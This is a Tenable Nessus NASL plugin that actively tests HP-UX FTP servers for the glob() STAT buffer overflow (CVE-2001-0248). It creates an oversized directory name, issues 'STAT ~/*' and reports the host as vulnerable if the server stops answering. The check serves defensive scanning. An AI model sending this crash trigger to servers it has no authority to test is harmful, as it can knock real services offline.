#
# (C) Tenable Network Security, Inc.
#

# TODO: have not observed enough HP-UX FTP banners, safecheck
# is inaccurate and even wrong!
#
# TODO: do not check other FTPD 
#
# From COVERT-2001-02:
# "when an FTP daemon receives a request involving a
# file that has a tilde as its first character, it typically runs the
# entire filename string through globbing code in order to resolve the
# specified home directory into a full path.  This has the side effect
# of expanding other metacharacters in the pathname string, which can
# lead to very large input strings being passed into the main command
# processing routines. This can lead to exploitable buffer overflow
# conditions, depending upon how these routines manipulate their input."
#

include("compat.inc");

if (description)
{
 script_id(11372);
 script_version("$Revision: 1.25 $");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");

 script_cve_id("CVE-2001-0248");
 script_bugtraq_id(2552);
 script_osvdb_id(13838);
 script_xref(name:"CERT-CC", value:"CA-2001-07");

 script_name(english:"HP-UX ftpd glob() Expansion STAT Buffer Overflow");
 script_summary(english:"Checks if the remote HPUX ftp can be buffer overflown");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote HPUX 11 FTP server is affected by a buffer overflow
vulnerability.  The overflow occurs when the STAT command is issued with
an argument that expands into an oversized string after being processed
by the 'globa()' function.");
 # https://web.archive.org/web/20040917154450/http://archives.neohapsis.com/archives/tru64/2002-q3/0017.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?91e769e0" );
 script_set_attribute(attribute:"solution", value:"Apply the patch from your vendor.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/04/09");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/13");
 script_set_attribute(attribute:"patch_publication_date", value:"2002/09/10");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/o:hp:hp-ux");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"FTP");

 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_writeable_directories.nasl");
 script_require_keys("ftp/login", "ftp/writeable_dir");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here :
#
include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

# First, we need access
login = get_kb_item_or_exit("ftp/login");
password = get_kb_item("ftp/password");

port = get_ftp_port(default: 21);

# Then, we need a writeable directory
wri = get_kb_item("ftp/"+port+"/writeable_dir");
if (! wri) wri = get_kb_item_or_exit("ftp/writeable_dir");

# Connect to the FTP server
soc = open_sock_tcp(port);
if (!soc) exit(1);

	if(ftp_authenticate(socket:soc, user:login, pass:password))
	{
		# We are in

		c = string("CWD ", wri, "\r\n");
		send(socket:soc, data:c);
		b = ftp_recv_line(socket:soc);
		if(!egrep(pattern:"^250.*", string:b)) exit(0);
		mkd = string("MKD ", crap(505), "\r\n");	#505+4+2=511
		mkdshort = string("MKD ", crap(249), "\r\n");	#249+4+2=255
		stat = string("STAT ~/*\r\n");

		send(socket:soc, data:mkd);
		b = ftp_recv_line(socket:soc);
		if(!egrep(pattern:"^257 .*", string:b)) {
			#If the server refuse to creat a long dir for some 
			#reason, try a short one to see if it will die.
			send(socket:soc, data:mkdshort);
			b = ftp_recv_line(socket:soc);
			if(!egrep(pattern:"^257 .*", string:b)) exit(0);
		}

		#STAT use control channel
		send(socket:soc, data:stat);
		b = ftp_recv_line(socket:soc);
		if(!b){
			security_hole(port);
			exit(0);
		} else {
			ftp_close(socket:soc);
		}

	}
